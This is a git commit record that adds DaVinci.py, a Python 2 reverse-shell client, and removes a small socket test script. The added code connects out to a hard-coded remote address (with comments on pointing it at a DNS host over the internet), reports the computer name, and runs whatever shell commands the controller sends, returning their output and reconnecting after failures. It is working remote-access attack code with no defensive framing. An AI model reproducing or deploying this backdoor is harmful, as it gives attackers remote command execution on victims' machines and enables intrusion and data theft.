1f1f25f177022f621bbecfb2a5d3b5a573ae9d84
huytg <30472673+huytg@users.noreply.github.com>
2018-06-23 14:49:38 -0400

    this time for real

---
+++ DaVinci.py
@@ -0,0 +1,44 @@
+import socket, os, subprocess, time
+def connect():
+    os.system('cls')
+    global host
+    global port
+    global s
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    port = 5558
+    host = ('10.8.101.16')
+    #localIP in case your testing inside your network
+    #host = socket.gethostbyname('YOURDNSHOSTHERE')
+    #here you could insert a DNS host and then use it to connect over WAN.
+    try:
+        print ('[!] Trying to connect to %s:%s'%(host,port))
+        s.connect((host,port))
+        print ('[*] Connection estabilished.')
+        s.send(os.environ['COMPUTERNAME'])
+        #popen = true
+    except:
+        print ('Could not connect.')
+        time.sleep(10)
+        connect()
+
+def receive():
+    receive = s.recv(100024)
+    print 'receive: %s'%(receive)
+    if receive == ('quit'):
+        s.close()
+        connect()
+    elif receive[0:5] == ('shell'):
+        proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        args = proc2.stdout.read() + proc2.stderr.read()
+    else:
+        args = ('no valid input was given.')
+    send(args)
+
+def send(args):
+        send = s.send(args)
+        receive()
+
+def main():
+    connect()
+    receive()
+    s.close()
--- client.py
+++
@@ -1,8 +0,0 @@
-import socket
-
-HOST = '10.8.101.56'
-PORT = 5555
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-s.settimeout(5)
-s.sendall(b'hi Banks')
